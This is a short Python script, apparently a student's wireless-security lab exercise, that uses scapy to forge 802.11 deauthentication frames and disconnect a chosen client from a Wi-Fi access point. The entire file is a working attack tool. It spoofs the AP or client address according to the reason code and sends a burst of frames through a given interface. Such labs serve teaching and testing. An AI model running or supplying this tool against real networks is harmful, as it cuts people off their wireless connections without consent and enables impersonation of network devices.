'''
SWI - Labo1
Auteurs : Edin Mujkanovic et Daniel Oliviera Paiva
But : Permet de déauthentifier un utilisateur d'un wifi
'''

import argparse

from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth


# On recupere les arguments passes en parametres
parser = argparse.ArgumentParser(description='Deauth attack based on scapy library.')
parser.add_argument("--interface", required=True, help="Interface used to send packets")
parser.add_argument("--client", required=True, help="Client to target")
parser.add_argument("--bssid", required=True, help="AP to target")
parser.add_argument("--code", required=True, help="Deauthentication code")
args = parser.parse_args()

src = dest = ""

# On definit les differentes destinations et sources selon le reason code
# AP to STA
if args.code in ["1","5"]:
    src = args.bssid
    dest = args.client
# STA to AP
elif args.code in ["4", "8"]:
    src = args.client
    dest = args.bssid
else:
    print("Reason code not supported")
    exit()


#On prepare le paquet
dot11 = Dot11(addr1=dest, addr2=src, addr3=args.bssid)
packetToSend = RadioTap()/dot11/Dot11Deauth(reason=int(args.code))
#On envoit 10 paquets
sendp(packetToSend, inter=0.01, count=10, iface=args.interface)



